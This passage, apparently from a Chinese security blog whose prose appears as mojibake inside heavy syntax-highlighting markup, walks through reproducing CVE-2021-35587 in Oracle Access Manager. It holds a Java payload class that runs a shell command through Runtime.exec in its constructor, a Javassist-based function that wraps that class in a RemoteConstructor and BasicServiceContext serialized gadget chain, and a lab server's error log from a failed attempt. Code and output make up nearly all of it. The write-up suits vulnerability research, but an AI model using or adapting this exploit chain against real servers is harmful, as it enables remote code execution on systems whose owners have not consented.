</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.Remotable<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.RemoteConstructor<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.Serializable<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test7</span> <span style=color:#66d9ef>implements</span> Remotable<span style=color:#f92672>,</span>Serializable <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>test7</span><span style=color:#f92672>()</span>  <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;touch /tmp/hackedbyneo8&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> RemoteConstructor <span style=color:#a6e22e>getRemoteConstructor</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setRemoteConstructor</span><span style=color:#f92672>(</span>RemoteConstructor remoteConstructor<span style=color:#f92672>)</span> <span style=color:#f92672>{}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æœ€åˆç‰ˆæœ¬çš„CVE-2021-35587() å¦‚ä¸‹</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-71-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-71-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2021_35587</span><span style=color:#f92672>(</span>Class poccls<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>poccls<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        AttributeHolder attributeHolder<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> AttributeHolder<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        Method setInternalValue<span style=color:#f92672>=</span>attributeHolder<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;setInternalValue&#34;</span><span style=color:#f92672>,</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        setInternalValue<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        setInternalValue<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>attributeHolder<span style=color:#f92672>,</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        BasicServiceContext basicServiceContext<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> BasicServiceContext<span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>attributeHolder<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>basicServiceContext<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å°†test7ç›´æ¥ç”¨ä¼ å…¥CVE-2021-35587() å‡½æ•°ä¸­ï¼Œä¼šæŠ¥é”™</p><p>ç»ˆç«¯é”™è¯¯æ—¥å¿—å¦‚ä¸‹ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-72-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-72-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span># docker exec oamms tail -f  /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;Jul</span> <span style=color:#960050;background-color:#1e0010>14,</span> <span style=color:#960050;background-color:#1e0010>2022</span> <span style=color:#960050;background-color:#1e0010>11:02:07,458</span> <span style=color:#960050;background-color:#1e0010>AM</span> <span style=color:#960050;background-color:#1e0010>UTC</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;Error&gt;</span> <span style=color:#f92672>&lt;HTTP&gt;</span> <span style=color:#f92672>&lt;BEA-101017&gt;</span> <span style=color:#960050;background-color:#1e0010>&lt;</span>[ServletContext@523535658[app:oam_server module:oam path:null spec-version:3.1]] Root cause of ServletException.
</span></span><span style=display:flex><span>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:635)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span><span style=display:flex><span>Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.findClass(ClassLoader.java:523)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span><span style=display:flex><span>&gt; 
</span></span></code></pre></td></tr></table></div></div><p>æŸ¥çœ‹æ—¥å¿—çœ‹åˆ°å®Œæ•´é”™è¯¯å †æ ˆ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-1>  1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-2>  2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-3>  3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-4>  4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-5>  5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-6>  6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-7>  7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-8>  8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-9>  9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-10> 10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-11> 11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-12> 12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-13> 13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-14> 14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-15> 15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-16> 16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-17> 17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-18> 18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-19> 19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-20> 20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-21> 21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-22> 22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-23> 23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-24> 24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-25> 25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-26> 26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-27> 27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-28> 28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-29> 29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-30> 30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-31> 31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-32> 32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-33> 33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-34> 34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-35> 35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-36> 36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-37> 37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-38> 38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-39> 39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-40> 40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-41> 41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-42> 42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-43> 43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-44> 44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-45> 45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-46> 46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-73-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-73-47> 47</a>
